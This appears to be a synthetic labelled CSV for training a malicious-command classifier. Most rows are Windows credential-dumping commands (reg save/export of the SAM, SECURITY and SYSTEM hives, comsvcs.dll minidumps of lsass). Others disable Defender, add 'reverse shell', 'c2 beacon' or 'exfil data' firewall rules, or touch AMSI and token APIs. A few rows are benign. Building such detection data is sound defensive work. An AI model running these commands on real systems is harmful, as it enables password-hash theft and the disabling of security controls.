text,label
reg save hklm\sam c:\windows\temp\fer6sw76.save,1
reg save hklm\sam c:\windows\temp\u603yith.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\dxinrb6y.dat""",1
reg save hklm\system c:\windows\temp\a1yhb5hq.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\usoo0nr1.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\m6kk50mp.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\vkzoqp7z.dat""",1
"cmd.exe /c ""rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\system c:\windows\temp\vvhjk9rn.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\za450kyt.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\t3d5wgy2.dat""",1
reg export hklm\security c:\windows\temp\4d8xwzt0.save,1
reg   export   hklm\system   c:\windows\temp\axg5vn51.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\4zlw0e4n.dat""",1
reg export hklm\security c:\windows\temp\wbrrpq1c.save,1
reg export hklm\system c:\windows\temp\ibn0bo4j.save,1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\ggv34tqk.save""",1
reg save hklm\system c:\windows\temp\gd1ggq7u.save,1
reg save hklm\security c:\windows\temp\3eb6k6mh.save,1
reg   export   hklm\security   c:\windows\temp\q9nrfw1v.save,1
$a  =  [ref].assembly.gettype('system.management.automation.amsiutils'),3
"powershell -nop -c ""reg export hklm\system c:\windows\temp\ndlru8pt.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\s0fes3jn.dat""",1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\d56a9p6d.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\yfzchbnm.dat""",1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\x3t4tkcx.save""",1
reg save hklm\system c:\windows\temp\20jk9vk8.save,1
reg export hklm\sam c:\windows\temp\iicyabm7.save,1
reg save hklm\system c:\windows\temp\fdi1ecuc.save,1
netsh   dump   >   netconfig.txt,0
"powershell -nop -c ""reg save hklm\sam c:\temp\c3yrqws6.dat""",1
reg save hklm\sam c:\windows\temp\0ps888yh.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\g9erpzxo.dat""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\m1nubtc6.dat""",1
reg save hklm\security c:\windows\temp\0ze4ef8c.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\y7mwzwzu.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\lhkh8u8k.dat""",1
reg save hklm\system c:\windows\temp\7grgxxo8.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\hjzaqj4y.dat""",1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg save hklm\security c:\windows\temp\5xlkpoi6.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\hcysd93x.dat""",1
reg export hklm\system c:\windows\temp\9cwc6emr.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\keiij4i1.dat""",1
reg export hklm\sam c:\windows\temp\offda9zp.save,1
reg save hklm\sam c:\windows\temp\2aof8mw2.save,1
rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888,2
reg export hklm\system c:\windows\temp\u03hy9wj.save,1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\ivk5v5r9.save""",1
reg save hklm\system c:\windows\temp\x3p2whp2.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\n5t2bopz.dat""",1
reg export hklm\system c:\windows\temp\rjn6d55r.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\els39u4z.dat""",1
reg export hklm\sam c:\windows\temp\grdef7do.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\wm4mp42g.dat""",1
reg save hklm\security c:\windows\temp\21dqw6mv.save,1
"powershell -nop -c ""rundll32.exe  c:\windows\system32\comsvcs.dll,  minidump  1234  c:\temp\lsass.dmp  full""",1
reg save hklm\sam c:\windows\temp\k039s7xq.save,1
reg save hklm\system c:\windows\temp\8gm52etx.save,1
reg save hklm\security c:\windows\temp\dzonc68b.save,1
reg export hklm\security c:\windows\temp\g6zyaqjp.save,1
ipconfig /all,0
reg export hklm\system c:\windows\temp\akvvzy2g.save,1
reg export hklm\sam c:\windows\temp\axkx2d4e.save,1
reg save hklm\security c:\windows\temp\0v5gpgg1.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\cq2vuq2c.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\rs43yjv6.dat""",1
reg save hklm\sam c:\windows\temp\6x1ihjuf.save,1
rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444,2
reg export hklm\sam c:\windows\temp\jhsbsgm4.save,1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\fw4j1m5m.dat""",1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\pmhdwe9y.save""",1
reg save hklm\system c:\windows\temp\8hglqv9n.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\a4o5axu6.dat""",1
"cmd.exe /c ""node   server.js   --port   3000""",0
"cmd.exe /c ""reg save hklm\sam c:\temp\q4dczefj.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\vorlzd0o.dat""",1
reg save hklm\sam c:\windows\temp\hddqid91.save,1
reg export hklm\system c:\windows\temp\ffuzi5bp.save,1
reg  export  hklm\system  c:\windows\temp\palzugto.save,1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\odp5ori6.dat""",1
reg save hklm\sam c:\windows\temp\9ar6zdgd.save,1
reg export hklm\security c:\windows\temp\mb3nlymy.save,1
reg save hklm\sam c:\windows\temp\g06thpgq.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\a6y8nz68.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\avsqsi3y.dat""",1
reg export hklm\sam c:\windows\temp\h030jxdj.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\qnu63mwd.dat""",1
reg export hklm\system c:\windows\temp\xd0ff4io.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\kd2pgxhs.dat""",1
"cmd.exe /c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\5vxzauwy.dat""",1
reg export hklm\security c:\windows\temp\bmj6zc9e.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\r2iarwx9.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\ngryaghv.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\security c:\temp\9sy8c1pk.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\9idqvxfj.dat""",1
reg save hklm\security c:\windows\temp\hv2but5c.save,1
reg save hklm\sam c:\windows\temp\jwwtvzxa.save,1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\s010bdu6.save""",1
reg export hklm\sam c:\windows\temp\t71jeoym.save,1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\rrm982oe.dat""""",1
reg save hklm\security c:\windows\temp\u5upgsbt.save,1
reg save hklm\security c:\windows\temp\zjwwefwk.save,1
reg export hklm\security c:\windows\temp\n3kmj497.save,1
reg save hklm\sam c:\windows\temp\x51wscif.save,1
reg export hklm\system c:\windows\temp\nnyqvo6f.save,1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\u17n6om8.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\368ypcy1.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\qho3n1ol.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\wlb7kq6q.dat""",1
"powershell -nop -c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: tcp 8888""",2
rule: c2 beacon | app: any | dir: outbound | act: allow | port: 4444,2
"cmd.exe /c ""reg export hklm\security c:\temp\fgypzkhq.dat""",1
reg export hklm\security c:\windows\temp\p2nrqdoe.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\zpam767g.dat""",1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\xhbsdjwm.save""",1
"powershell -nop -c ""backup-utility   write   hklm\software   to   c:\backups\config.dat""",0
"powershell -nop -c ""java  -jar  application.jar""",0
"powershell -nop -c ""reg save hklm\sam c:\temp\3hkjpiyp.dat""",1
reg export hklm\security c:\windows\temp\e8i7lna1.save,1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
reg save hklm\sam c:\windows\temp\8mb6fcr6.save,1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\7jo3jy2c.dat""""",1
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg export hklm\sam c:\windows\temp\axbvjf2j.save,1
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg save hklm\security c:\windows\temp\izoktd30.save,1
reg save hklm\system c:\windows\temp\ip2ghip7.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ksak8qoj.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\pulb26xq.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\l0a83use.dat""""",1
reg export hklm\security c:\windows\temp\zszvk5mw.save,1
reg save hklm\system c:\windows\temp\qkttxvhf.save,1
rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337,2
"powershell -nop -c ""reg save hklm\security c:\temp\4ulhpq4a.dat""",1
reg export hklm\security c:\windows\temp\fjl3kgs7.save,1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\cdkmh5e2.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\dn94dzmz.dat""",1
reg export hklm\security c:\windows\temp\hz24deiz.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\8uvp9ki3.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\0snbsuqi.dat""",1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\yh3n33u4.dat""",1
reg export hklm\system c:\windows\temp\tlkww5en.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\xnkprtag.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\e5ozk395.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\sgxbfn2b.dat""",1
"powershell -nop -c ""select-string  -path  c:\logs\app.log  -pattern  'failed  logon'""",0
"cmd.exe /c ""powershell -nop -c ""reg export hklm\sam c:\temp\a3sgo60o.dat""""",1
reg save hklm\security c:\windows\temp\g1r1bie2.save,1
reg save hklm\sam c:\windows\temp\vrm6v3gf.save,1
reg export hklm\security c:\windows\temp\m6k5a77t.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\v7eqx88z.dat""",1
"cmd.exe /c ""rule: exfil data | app: any | dir: outbound | act: allow | port: 4444""",2
"powershell -nop -c ""reg export hklm\security c:\temp\pkpedwrb.dat""",1
reg save hklm\system c:\windows\temp\qdx7tbx6.save,1
reg export hklm\sam c:\windows\temp\cxxa4a4s.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\8t1f5rvr.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\zqqr5dz8.dat""",1
reg export hklm\sam c:\windows\temp\r2shri6z.save,1
reg export hklm\system c:\windows\temp\rf4pb5yp.save,1
"cmd.exe /c ""sc  stop  windefend""",2
"cmd.exe /c ""backup-utility save registry config""",0
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"powershell -nop -c ""reg save hklm\security c:\temp\r2od988n.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\2x9nez0g.dat""",1
reg save hklm\system c:\windows\temp\5qu20ais.save,1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\sam c:\temp\062430td.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\1w8w4j8a.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\60jbkrr4.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\3f2ajiqg.dat""",1
reg save hklm\security c:\windows\temp\j2uw55ua.save,1
reg save hklm\sam c:\windows\temp\x9q9athi.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ek1yrywd.dat""",1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\cov0ctvl.save""",1
reg save hklm\sam c:\windows\temp\sgcndja8.save,1
reg save hklm\system c:\windows\temp\zy8ebnj0.save,1
reg export hklm\security c:\windows\temp\dumjnlpf.save,1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\69zfgnc3.dat""",1
reg save hklm\sam c:\windows\temp\hjtr77ww.save,1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\2onmlj5v.dat""""",1
reg save hklm\security c:\windows\temp\h2xx4c8y.save,1
reg save hklm\system c:\windows\temp\ak9saf1r.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\8mnv7c5n.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\6o1nhogr.dat""",1
reg save hklm\sam c:\windows\temp\906qvll9.save,1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""reg export hklm\security c:\temp\3bia28u2.dat""",1
reg export hklm\security c:\windows\temp\wyd18jej.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\vr9d1p6a.dat""",1
"powershell -nop -c ""rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full""",1
rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337,2
"cmd.exe /c ""reg save hklm\sam c:\temp\bin2rjsa.dat""",1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\tq8ntjh4.save""",1
reg save hklm\sam c:\windows\temp\rch6kyw3.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\t5b03scn.dat""",1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\mzdjbsiu.save""",1
reg export hklm\system c:\windows\temp\fg75sxdq.save,1
"cmd.exe /c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
"cmd.exe /c ""python  -m  http.server  8080""",0
reg save hklm\security c:\windows\temp\9y6biezw.save,1
reg export hklm\security c:\windows\temp\b2cwftre.save,1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\security c:\temp\3il1f9mw.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\l3vxvb0x.dat""",1
reg save hklm\system c:\windows\temp\jdb3teia.save,1
"powershell -nop -c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\flxoperp.dat""""",1
"powershell -nop -c ""sc  query  windefend""",0
reg save hklm\security c:\windows\temp\tf76kh5t.save,1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\maquaz3q.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\lbwetda0.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\wkuv2tic.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\5igoky96.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\5yo1qva4.dat""",1
"powershell -nop -c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337""",2
reg save hklm\security c:\windows\temp\0pa417bf.save,1
reg save hklm\system c:\windows\temp\c1vgpe1l.save,1
rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444,2
reg save hklm\system c:\windows\temp\cwpzxroz.save,1
reg export hklm\sam c:\windows\temp\6iflo9m2.save,1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\8ghu8bdg.save""",1
reg export hklm\security c:\windows\temp\7et20u55.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\84p5tctq.save""",1
reg export hklm\security c:\windows\temp\lhf9uumk.save,1
reg export hklm\sam c:\windows\temp\jtiw5e7b.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\mvgef80r.save""",1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\q9ehh4ka.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\3udllqxy.dat""",1
reg export hklm\security c:\windows\temp\z9xxk7mb.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  duplicatetokenex(...)""",3
"powershell -nop -c ""reg save hklm\sam c:\temp\7yk617fe.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\wx6yqzm5.dat""",1
reg export hklm\sam c:\windows\temp\pjw83hzi.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ya0eb2g4.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\y48hs2u2.dat""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\u2a2gmb7.dat""",1
reg   export   hklm\system   c:\windows\temp\o1iw7ua6.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\xr3ekwb0.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\69fcavti.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\1wic9z4i.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\vi96wieq.dat""",1
reg  save  hklm\system  c:\windows\temp\2a2qy1po.save,1
set-mppreference   -disablerealtimemonitoring   $true,2
klist   purge,3
reg export hklm\security c:\windows\temp\bc3yob9u.save,1
reg export hklm\security c:\windows\temp\rocmd33l.save,1
reg save hklm\sam c:\windows\temp\v1tkwjlp.save,1
reg export hklm\system c:\windows\temp\a3pryfcj.save,1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\7hw64wmk.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\6zcuqv1p.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\eao5cezn.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\rpzb5eew.dat""",1
reg export hklm\system c:\windows\temp\aaea5f2a.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\6ax9aq3r.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\7sgq0xyn.dat""",1
reg save hklm\sam c:\windows\temp\bkud9paj.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\gih4dbnw.save""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\c8i6jtkx.dat""""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\h287cka5.dat""""",1
reg export hklm\system c:\windows\temp\m5eeq8i2.save,1
reg export hklm\system c:\windows\temp\cyyyd374.save,1
"powershell -nop -c ""ping  8.8.8.8""",0
reg export hklm\system c:\windows\temp\polukv0d.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\dwxuzkl1.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\38gh5e60.dat""",1
"powershell -nop -c ""[dllimport(""advapi32.dll"")] extern bool amsiutils(...)""",3
rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\7xelcswv.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\t2vosvlm.dat""",1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"powershell -nop -c ""select-string   -path   c:\logs\app.log   -pattern   'failed   logon'""",0
"cmd.exe /c ""reg save hklm\sam c:\temp\64ywqtym.dat""",1
reg export hklm\system c:\windows\temp\39223ae1.save,1
reg export hklm\sam c:\windows\temp\z5xpu42x.save,1
reg save hklm\security c:\windows\temp\vyf5gnb0.save,1
"powershell -nop -c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: 4444""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\ztq8kjgg.dat""",1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\z8lfrxdq.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\iz8krjin.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\2fef2fmf.dat""",1
reg   export   hklm\sam   c:\windows\temp\8qwxjbs1.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\67j78l0q.dat""",1
reg export hklm\sam c:\windows\temp\ilm1nfmw.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\zf6h8w4l.dat""",1
reg export hklm\security c:\windows\temp\rzthk8or.save,1
reg export hklm\sam c:\windows\temp\kae2jko1.save,1
reg export hklm\sam c:\windows\temp\whg06sd2.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\zm5sszt3.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\9jsgaev7.dat""""",1
reg export hklm\security c:\windows\temp\wylir3ws.save,1
"powershell -nop -c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: 4444""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\bm15kedz.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\btc0n91z.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\yn6nq0z6.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\1od1plj7.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\wh16fkeg.dat""""",1
"cmd.exe /c ""rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full""",1
reg export hklm\sam c:\windows\temp\dvgexmhv.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\2xmy30uu.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\gl4de74k.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\n9m41jg8.dat""",1
reg export hklm\security c:\windows\temp\4n8mkk96.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\nnj9aykg.dat""",1
reg save hklm\system c:\windows\temp\b7h62lb2.save,1
reg export hklm\system c:\windows\temp\0czkgz6p.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\jmyq9n0y.dat""",1
reg export hklm\system c:\windows\temp\i9zgcijt.save,1
reg save hklm\security c:\windows\temp\w5lpwwqm.save,1
reg save hklm\sam c:\windows\temp\l95al4g5.save,1
reg save hklm\sam c:\windows\temp\xalq96ge.save,1
reg   export   hklm\security   c:\windows\temp\6fo0d31g.save,1
reg save hklm\sam c:\windows\temp\pm14yuq2.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\opzozwj9.dat""",1
reg export hklm\security c:\windows\temp\a4dgth0x.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\gm6vye6p.dat""",1
reg save hklm\sam c:\windows\temp\aj6yc3qw.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\j171gn9z.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\pu4z4wje.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\kttr0lww.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\6kuha6tk.dat""",1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\kgcaukfv.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\n4nrgf75.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\pbf10rkl.dat""",1
reg save hklm\security c:\windows\temp\cyihgd1g.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\2zk2v46e.dat""",1
"powershell -nop -c ""wmic product get name, version""",0
"cmd.exe /c ""reg export hklm\security c:\temp\h2jfg889.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\nphnokdh.dat""",1
rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337,2
reg save hklm\sam c:\windows\temp\8cxdrpev.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\7if2u0sf.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\9homivsb.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\eo0x84qm.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\v6ykdt55.dat""",1
reg save hklm\sam c:\windows\temp\s2qv8voy.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\e02nsdjg.dat""",1
reg export hklm\sam c:\windows\temp\mt07xdcb.save,1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\ty4rzibe.save""",1
reg save hklm\sam c:\windows\temp\vbztyphh.save,1
reg   save   hklm\system   c:\windows\temp\y4oof6nt.save,1
reg   export   hklm\security   c:\windows\temp\8bcohf0k.save,1
reg export hklm\security c:\windows\temp\he862be8.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\413gizf3.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\0ol5dylm.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\tk0wfpbr.dat""",1
"cmd.exe /c ""ping   8.8.8.8""",0
rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337,2
reg export hklm\system c:\windows\temp\bx5129d6.save,1
reg export hklm\system c:\windows\temp\f0s7fk3n.save,1
reg export hklm\security c:\windows\temp\12qnxpxo.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\u9xre3t6.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\1txx94kf.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\hfmvzyqt.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\2qivvdnt.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\um4ez0q4.dat""",1
reg   save   hklm\system   c:\windows\temp\om2zx9rj.save,1
reg save hklm\system c:\windows\temp\1y06amsb.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\484hdxd3.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\e8rq4alk.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\zn9bf4fc.dat""",1
reg export hklm\security c:\windows\temp\xfiz6p75.save,1
reg save hklm\system c:\windows\temp\v6lpv9xn.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\59srbzzk.dat""",1
reg export hklm\sam c:\windows\temp\yczfqyrs.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\kqukrtep.dat""",1
reg save hklm\security c:\windows\temp\9vly2th1.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\r5po8j2c.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\j683453e.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\k7mujp3m.dat""",1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\aqay7ehs.save""",1
reg save hklm\system c:\windows\temp\5fvsqxo5.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\4h4o9kt9.dat""",1
reg save hklm\sam c:\windows\temp\ejivzb73.save,1
reg export hklm\system c:\windows\temp\01l11job.save,1
reg  export  hklm\sam  c:\windows\temp\0y0n2m3m.save,1
reg save hklm\system c:\windows\temp\inhvn8td.save,1
rule: exfil data | app: any | dir: outbound | act: allow | port: 4444,2
"cmd.exe /c ""reg save hklm\sam c:\temp\48go8740.dat""",1
